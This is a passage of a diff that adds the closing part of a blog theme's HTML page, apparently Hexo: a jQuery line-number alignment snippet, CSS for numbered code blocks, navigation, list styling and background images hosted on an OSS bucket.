+        
+    
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+    
+        
+        
+    }
+    
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+    .nav-right nav a.hover > span{
+        color: #ffffff !important;
+    }
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+    
+    /* 背景图样式 */
+    
+    #post {
+        background: url(https://ttycp3.oss-cn-beijing.aliyuncs.com/img/110.jpg);
+    }
+    
+    
+
+
+    /*引用块样式*/
+    
+    
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://ttycp3.oss-cn-beijing.aliyuncs.com/img/4caf928d4512df81ec482d1e953bf4db9dbb7533.jpg@942w_1307h_progressive.webp");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+    
+    
+</style>
+
+
+
+
+
+
+
+
+
+
+</html>
